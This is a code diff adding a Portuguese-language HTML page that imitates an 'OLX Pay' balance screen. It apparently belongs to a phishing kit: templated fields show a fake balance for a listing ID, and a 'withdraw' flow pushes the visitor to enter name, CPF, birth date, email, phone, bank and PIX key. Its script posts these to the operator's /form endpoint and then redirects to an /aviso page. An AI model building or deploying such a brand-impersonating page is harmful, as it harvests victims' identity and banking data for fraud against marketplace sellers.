@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OLX Pay - Saldo</title>
+    <style>
+        /* Seu CSS existente aqui... */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+        }
+
+        .top-header {
+            background-color: white;
+            padding: 15px 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+        }
+
+        .logo-container {
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo-container img {
+            height: 30px;
+            width: auto;
+            display: block;
+        }
+
+        .logo-placeholder {
+            color: #6b46c1;
+            font-size: 18px;
+            font-weight: bold;
+            display: none;
+        }
+
+        .header {
+            background: linear-gradient(135deg, #6b46c1, #9333ea);
+            color: white;
+            padding: 20px;
+            position: relative;
+        }
+
+        .saldo-section {
+            padding: 20px 0;
+        }
+
+        .saldo-title {
+            font-size: 16px;
+            font-weight: normal;
+            opacity: 0.9;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 10px;
+        }
+
+        .eye-icon {
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .saldo-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            margin-bottom: 30px;
+        }
+
+        .saldo-valor {
+            font-size: 45px;
+            font-weight: 300;
+            line-height: 1;
+        }
+
+        .sacar-btn {
+            background-color: #ff6b35;
+            color: white;
+            padding: 12px 20px;
+            border: none;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .total-receber {
+            background-color: rgba(0, 0, 0, 0.2);
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 16px;
+        }
+
+        .arrow {
+            font-size: 18px;
+        }
+
+        .container {
+            padding: 20px;
+        }
+
+        .dados-pagamento {
+            background-color: white;
+            border-radius: 12px;
+            padding: 25px 20px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .dados-pagamento h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+            color: #1f2937;
+            font-weight: 600;
+        }
+
+        .dados-pagamento p {
+            color: #6b7280;
+            font-size: 14px;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        .configurar-btn {
+            background-color: #6b46c1;
+            color: white;
+            padding: 14px 24px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        /* Preview dos dados salvos */
+        .dados-preview {
+            background-color: white;
+            border-radius: 12px;
+            padding: 20px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.08);
+            display: none; /* Começa oculto */
+        }
+
+        .dados-preview h3 {
+            font-size: 18px;
+            margin-bottom: 15px;
+            color: #1f2937;
+            font-weight: 600;
+        }
+
+        .preview-item {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #f3f4f6;
+        }
+
+        .preview-item:last-child {
+            border-bottom: none;
+        }
+
+        .preview-label {
+            color: #6b7280;
+            font-size: 14px;
+        }
+
+        .preview-value {
+            color: #1f2937;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .editar-btn {
+            background-color: #f3f4f6;
+            color: #6b46c1;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 15px;
+            display: block; /* Para centralizar com margin auto se necessário */
+            width: fit-content;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-content {
+            background-color: white;
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow-y: auto;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, #6b46c1, #9333ea);
+            color: white;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .modal-title {
+            font-size: 16px;
+            font-weight: 500;
+        }
+
+        .close-x {
+            font-size: 24px;
+            cursor: pointer;
+            font-weight: normal;
+        }
+
+        .modal-body {
+            padding: 20px;
+            flex-grow: 1; /* Faz o corpo do modal ocupar o espaço restante */
+            overflow-y: auto; /* Adiciona scroll apenas ao corpo se necessário */
+        }
+
+        .modal-subtitle {
+            color: #6b7280;
+            font-size: 14px;
+            line-height: 1.4;
+            margin-bottom: 30px;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #374151;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .form-group input,
+        .form-group select {
+            width: 100%;
+            padding: 15px 0;
+            border: none;
+            border-bottom: 1px solid #d1d5db;
+            font-size: 16px;
+            background-color: transparent;
+            outline: none;
+        }
+
+        .form-group input:-webkit-autofill,
+        .form-group input:-webkit-autofill:hover,
+        .form-group input:-webkit-autofill:focus,
+        .form-group input:-webkit-autofill:active {
+            -webkit-box-shadow: 0 0 0 30px white inset !important;
+            box-shadow: 0 0 0 30px white inset !important;
+        }
+
+
+        .form-group input:focus,
+        .form-group select:focus {
+            border-bottom-color: #6b46c1;
+        }
+
+        .checkbox-container {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin: 30px 0;
+        }
+
+        .checkbox-container input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            margin-top: 2px; /* Alinhamento vertical com o texto */
+            flex-shrink: 0;
+        }
+
+        .checkbox-text {
+            font-size: 14px;
+            color: #6b7280;
+            line-height: 1.4;
+        }
+
+        .checkbox-text a {
+            color: #6b46c1;
+            text-decoration: underline;
+        }
+
+        .continuar-btn {
+            background-color: #ff6b35;
+            color: white;
+            padding: 15px 24px;
+            border: none;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px; /* Reduzido para melhor espaçamento */
+        }
+
+        .continuar-btn:disabled {
+            background-color: #d1d5db;
+            cursor: not-allowed;
+        }
+
+        .btn-container {
+            background-color: white;
+            padding: 15px 20px; /* Ajustado o padding */
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.1);
+            margin-top: auto; /* Empurra para o final do flex container (.modal-content) */
+        }
+
+
+        /* Responsivo */
+        @media (min-width: 768px) {
+            .modal-content {
+                margin: 5% auto;
+                width: 90%;
+                max-width: 450px; /* Aumentado um pouco para melhor visualização */
+                height: auto;
+                max-height: 90vh;
+                border-radius: 12px;
+                flex-direction: column; /* Mantém column */
+            }
+
+            .modal-header {
+                border-radius: 12px 12px 0 0;
+            }
+
+            .btn-container {
+                position: static; /* Botão volta ao fluxo normal em desktop */
+                box-shadow: none;
+                padding-bottom: 20px; /* Garante padding no final do modal em desktop */
+            }
+
+            .modal-body {
+                 padding-bottom: 0; /* Remove padding extra do body em desktop */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="top-header">
+        <div class="logo-container">
+            <img src="olx.svg" alt="OLX Logo" id="logoImg">
+            <span class="logo-placeholder" id="logoFallback">OLX PAY</span>
+        </div>
+    </div>
+
+    <div class="header">
+        <div class="saldo-section">
+            <div class="saldo-title">
+                Saldo disponível
+                <span class="eye-icon">👁</span>
+            </div>
+            <div class="saldo-container">
+                <div class="saldo-valor">{{preco}}</div>
+                <button class="sacar-btn" id="sacarBtn">Sacar agora</button>
+            </div>
+        </div>
+        <div class="total-receber">
+            <span>Total a receber {{preco}}</span>
+            </div>
+    </div>
+
+    <div class="container">
+        <div class="dados-pagamento" id="dadosPagamento">
+            <h3>Dados para recebimento</h3>
+            <p>Para receber pagamentos em sua conta, você precisa preencher seus dados bancários e informações pessoais.</p>
+            <button class="configurar-btn" onclick="openModal()">Preencher dados</button>
+        </div>
+
+        <div class="dados-preview" id="dadosPreview">
+            <h3>Dados cadastrados</h3>
+            <div class="preview-item">
+                <span class="preview-label">Nome:</span>
+                <span class="preview-value" id="previewNome">-</span>
+            </div>
+             <div class="preview-item"> <span class="preview-label">CPF:</span>
+                <span class="preview-value" id="previewCpf">-</span>
+            </div>
+            <div class="preview-item"> <span class="preview-label">Email:</span>
+                <span class="preview-value" id="previewEmail">-</span>
+            </div>
+            <div class="preview-item"> <span class="preview-label">Telefone:</span>
+                <span class="preview-value" id="previewTelefone">-</span>
+            </div>
+            <div class="preview-item">
+                <span class="preview-label">Banco:</span>
+                <span class="preview-value" id="previewBanco">-</span>
+            </div>
+            <div class="preview-item">
+                <span class="preview-label">Chave PIX:</span>
+                <span class="preview-value" id="previewChavePix">-</span>
+            </div>
+            <button class="editar-btn" onclick="openModal()">Editar dados</button>
+        </div>
+    </div>
+
+    <div id="paymentModal" class="modal">
+        <div class="modal-content">
+            <div class="modal-header">
+                <span class="modal-title">Ativar OLX Pay</span>
+                <span class="close-x" onclick="closeModal()">×</span>
+            </div>
+            <div class="modal-body">
+                <p class="modal-subtitle">Quase lá! Por favor, verifique se os dados que você preencheu estão corretos.</p>
+
+                <form id="paymentForm">
+                    <div class="form-group">
+                        <label for="nome">Nome Completo</label>
+                        <input type="text" id="nome" name="nome" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cpf">CPF</label>
+                        <input type="text" id="cpf" name="cpf" placeholder="000.000.000-00" required maxlength="14">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="nascimento">Data de Nascimento</label>
+                        <input type="date" id="nascimento" name="nascimento" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="email">E-mail</label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="telefone">Telefone</label>
+                        <input type="tel" id="telefone" name="telefone" placeholder="(00) 00000-0000" required maxlength="15">
+                    </div>
+
+                    <div class="form-group">
+                        <label for="banco">Banco</label>
+                        <select id="banco" name="banco" required>
+                            <option value="">Selecione o banco</option>
+                            <option value="Banco do Brasil">Banco do Brasil</option>
+                            <option value="Bradesco">Bradesco</option>
+                            <option value="Caixa Econômica Federal">Caixa Econômica Federal</option>
+                            <option value="Itaú">Itaú</option>
+                            <option value="Santander">Santander</option>
+                            <option value="Nu Pagamentos">Nu Pagamentos (Nubank)</option>
+                            <option value="Banco Inter">Banco Inter</option>
+                            <option value="Mercado Pago">Mercado Pago</option>
+                            <option value="PagBank">PagBank (PagSeguro)</option>
+                            <option value="C6 Bank">C6 Bank</option>
+                            <option value="Outro">Outro</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="chavePix">Chave PIX</label>
+                        <input type="text" id="chavePix" name="chavePix" placeholder="CPF, E-mail, Telefone ou Chave aleatória" required>
+                    </div>
+
+                    <div class="checkbox-container">
+                        <input type="checkbox" id="termos" name="termos" required>
+                        <label for="termos" class="checkbox-text">
+                            Eu aceito os <a href="#" target="_blank">Termos e Condições da OLX Pay</a>
+                        </label>
+                    </div>
+                </form>
+            </div>
+
+            <div class="btn-container">
+                <button type="button" class="continuar-btn" id="continuarBtn" disabled>Continuar</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Variáveis globais do formulário e botões (se necessário, senão obter dentro das funções)
+        const form = document.getElementById('paymentForm');
+        const continuarBtn = document.getElementById('continuarBtn');
+        const termosCheckbox = document.getElementById('termos');
+        const idAnuncio = "{{id}}";
+        const localStorageKey = `olxPayData_${idAnuncio}`;
+
+        const requiredFieldsIds = ['nome', 'cpf', 'nascimento', 'email', 'telefone', 'banco', 'chavePix'];
+
+        // --- MANIPULAÇÃO DA LOGO ---
+        document.addEventListener('DOMContentLoaded', function() {
+            const logoImg = document.getElementById('logoImg');
+            const logoFallback = document.getElementById('logoFallback');
+
+            if (logoImg) {
+                logoImg.onerror = function() {
+                    this.style.display = 'none';
+                    if (logoFallback) logoFallback.style.display = 'block';
+                };
+
+                logoImg.onload = function() {
+                    if (this.naturalWidth > 0) {
+                        this.style.display = 'block';
+                        if (logoFallback) logoFallback.style.display = 'none';
+                    } else {
+                        this.onerror();
+                    }
+                };
+                if (logoImg.complete && logoImg.naturalWidth === 0) {
+                     logoImg.onerror();
+                }
+                setTimeout(function() {
+                    if (logoImg.naturalWidth === 0 && logoImg.style.display !== 'none') {
+                         logoImg.style.display = 'none';
+                         if (logoFallback) logoFallback.style.display = 'block';
+                    }
+                }, 1500);
+            }
+
+            // Carregar dados e configurar listeners gerais
+            loadSavedData();
+            setupFormListeners();
+            setupButtonListeners();
+        });
+
+        // --- MÁSCARAS ---
+        function applyCPFMask(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.substring(0, 11);
+
+            if (value.length > 9) {
+                value = value.replace(/(\d{3})(\d{3})(\d{3})(\d{1,2})$/, '$1.$2.$3-$4');
+            } else if (value.length > 6) {
+                value = value.replace(/(\d{3})(\d{3})(\d{1,3})$/, '$1.$2.$3');
+            } else if (value.length > 3) {
+                value = value.replace(/(\d{3})(\d{1,3})$/, '$1.$2');
+            }
+            e.target.value = value;
+        }
+
+        function applyPhoneMask(e) {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 11) value = value.substring(0, 11);
+
+            if (value.length > 10) {
+                value = value.replace(/(\d{2})(\d{5})(\d{4})$/, '($1) $2-$3');
+            } else if (value.length > 6) {
+                value = value.replace(/(\d{2})(\d{4,5})$/, '($1) $2');
+            } else if (value.length > 2) {
+                value = value.replace(/(\d{2})(\d*)$/, '($1) $2');
+            }
+            e.target.value = value;
+        }
+
+        // --- VALIDAÇÃO DO FORMULÁRIO ---
+        function validateForm() {
+            let allValid = true;
+
+            requiredFieldsIds.forEach(fieldName => {
+                const field = document.getElementById(fieldName);
+                if (!field || !field.value.trim()) {
+                    allValid = false;
+                }
+            });
+
+            const cpfField = document.getElementById('cpf');
+            if (cpfField && cpfField.value.replace(/\D/g, '').length < 11) {
+                allValid = false;
+            }
+            const telefoneField = document.getElementById('telefone');
+            if (telefoneField && telefoneField.value.replace(/\D/g, '').length < 10) {
+                allValid = false;
+            }
+
+            if (termosCheckbox && !termosCheckbox.checked) {
+                allValid = false;
+            }
+
+            if (continuarBtn) {
+                continuarBtn.disabled = !allValid;
+                continuarBtn.style.backgroundColor = allValid ? '#ff6b35' : '#d1d5db';
+            }
+        }
+
+        // --- CONTROLE DE VISUALIZAÇÃO DAS SEÇÕES ---
+        function showPreview() {
+            const dadosPagamentoDiv = document.getElementById('dadosPagamento');
+            const dadosPreviewDiv = document.getElementById('dadosPreview');
+            if (dadosPagamentoDiv) dadosPagamentoDiv.style.display = 'none';
+            if (dadosPreviewDiv) dadosPreviewDiv.style.display = 'block';
+        }
+
+        function showFormSection() {
+            const dadosPagamentoDiv = document.getElementById('dadosPagamento');
+            const dadosPreviewDiv = document.getElementById('dadosPreview');
+            if (dadosPagamentoDiv) dadosPagamentoDiv.style.display = 'block';
+            if (dadosPreviewDiv) dadosPreviewDiv.style.display = 'none';
+        }
+
+        // --- LOCALSTORAGE E PREENCHIMENTO DE DADOS ---
+        function loadSavedData() {
+            const savedData = localStorage.getItem(localStorageKey);
+
+            if (savedData) {
+                const data = JSON.parse(savedData);
+
+                // Atualizar preview
+                document.getElementById('previewNome').textContent = data.nome || '-';
+                document.getElementById('previewCpf').textContent = data.cpf || '-';
+                document.getElementById('previewEmail').textContent = data.email || '-';
+                document.getElementById('previewTelefone').textContent = data.telefone || '-';
+                document.getElementById('previewBanco').textContent = data.banco || '-';
+                document.getElementById('previewChavePix').textContent = data.chavePix || '-';
+
+                showPreview();
+            } else {
+                showFormSection();
+            }
+            validateForm();
+        }
+
+        function loadSavedDataToForm() {
+            const savedData = localStorage.getItem(localStorageKey);
+            if (savedData) {
+                const data = JSON.parse(savedData);
+                document.getElementById('nome').value = data.nome || '';
+
+                const cpfInput = document.getElementById('cpf');
+                cpfInput.value = data.cpf || '';
+                cpfInput.dispatchEvent(new Event('input')); // Para aplicar máscara
+
+                document.getElementById('nascimento').value = data.nascimento || '';
+                document.getElementById('email').value = data.email || '';
+
+                const telInput = document.getElementById('telefone');
+                telInput.value = data.telefone || '';
+                telInput.dispatchEvent(new Event('input')); // Para aplicar máscara
+
+                document.getElementById('banco').value = data.banco || '';
+                document.getElementById('chavePix').value = data.chavePix || '';
+                if(termosCheckbox) termosCheckbox.checked = true;
+            }
+        }
+
+        // --- MODAL ---
+        function openModal() {
+            const paymentModal = document.getElementById('paymentModal');
+            if (paymentModal) {
+                paymentModal.style.display = 'block';
+                document.body.style.overflow = 'hidden';
+                loadSavedDataToForm();
+                validateForm();
+            }
+        }
+
+        function closeModal() {
+            const paymentModal = document.getElementById('paymentModal');
+            if (paymentModal) {
+                paymentModal.style.display = 'none';
+                document.body.style.overflow = 'auto';
+            }
+        }
+
+        // --- SUBMISSÃO DO FORMULÁRIO ---
+        async function submitForm() {
+            if (!continuarBtn || continuarBtn.disabled) return;
+
+            continuarBtn.disabled = true;
+            continuarBtn.textContent = 'Enviando...';
+
+            const dataToSave = {
+                nome: document.getElementById('nome').value,
+                cpf: document.getElementById('cpf').value,
+                nascimento: document.getElementById('nascimento').value,
+                email: document.getElementById('email').value,
+                telefone: document.getElementById('telefone').value,
+                banco: document.getElementById('banco').value,
+                chavePix: document.getElementById('chavePix').value
+            };
+
+            const backendFormData = new FormData();
+            for (const key in dataToSave) {
+                backendFormData.append(key, dataToSave[key]);
+            }
+
+            try {
+                const response = await fetch(`/form?id=${idAnuncio}`, {
+                    method: 'POST',
+                    body: backendFormData
+                });
+
+                if (!response.ok) {
+                    const errorText = await response.text();
+                    throw new Error(`HTTP error! status: ${response.status}, message: ${errorText}`);
+                }
+
+                const result = await response.json();
+
+                if (result.status === 'success') {
+                    localStorage.setItem(localStorageKey, JSON.stringify(dataToSave));
+
+                    document.getElementById('previewNome').textContent = dataToSave.nome;
+                    document.getElementById('previewCpf').textContent = dataToSave.cpf;
+                    document.getElementById('previewEmail').textContent = dataToSave.email;
+                    document.getElementById('previewTelefone').textContent = dataToSave.telefone;
+                    document.getElementById('previewBanco').textContent = dataToSave.banco;
+                    document.getElementById('previewChavePix').textContent = dataToSave.chavePix;
+
+                    //alert('Dados enviados e salvos com sucesso!');
+                    closeModal();
+                    showPreview();
+                } else {
+                    alert(`Erro ao enviar dados: ${result.message || 'Erro desconhecido.'}`);
+                }
+
+            } catch (error) {
+                console.error('Erro ao enviar formulário:', error);
+                alert(`Ocorreu um erro ao enviar os dados: ${error.message}. Verifique o console para mais detalhes.`);
+            } finally {
+                continuarBtn.disabled = false;
+                continuarBtn.textContent = 'Continuar';
+                validateForm();
+            }
+        }
+
+        // --- CONFIGURAÇÃO DOS LISTENERS ---
+        function setupFormListeners() {
+            const cpfInput = document.getElementById('cpf');
+            const telInput = document.getElementById('telefone');
+
+            if (cpfInput) cpfInput.addEventListener('input', applyCPFMask);
+            if (telInput) telInput.addEventListener('input', applyPhoneMask);
+
+            requiredFieldsIds.forEach(fieldName => {
+                const field = document.getElementById(fieldName);
+                if (field) {
+                    field.addEventListener('input', validateForm);
+                    field.addEventListener('change', validateForm);
+                }
+            });
+            if (termosCheckbox) termosCheckbox.addEventListener('change', validateForm);
+        }
+
+        function setupButtonListeners() {
+            const configurarBtn = document.querySelector('.configurar-btn');
+            const editarBtnModal = document.querySelector('.editar-btn'); // Botão "Editar dados" no preview
+            const closeXModalBtn = document.querySelector('.close-x');
+            const sacarAgoraBtn = document.getElementById('sacarBtn');
+
+            if (configurarBtn) configurarBtn.addEventListener('click', openModal);
+            if (editarBtnModal) editarBtnModal.addEventListener('click', openModal); // "Editar dados" também abre o modal
+            if (closeXModalBtn) closeXModalBtn.addEventListener('click', closeModal);
+            if (continuarBtn) continuarBtn.addEventListener('click', submitForm);
+
+            if (sacarAgoraBtn) {
+                sacarAgoraBtn.addEventListener('click', function() {
+                    const savedData = localStorage.getItem(localStorageKey);
+                    if (savedData) {
+                        window.location.href = `/aviso?id={{id}}`;
+                    } else {
+                        openModal();
+                    }
+                });
+            }
+        }
+    </script>
+</body>
+</html>
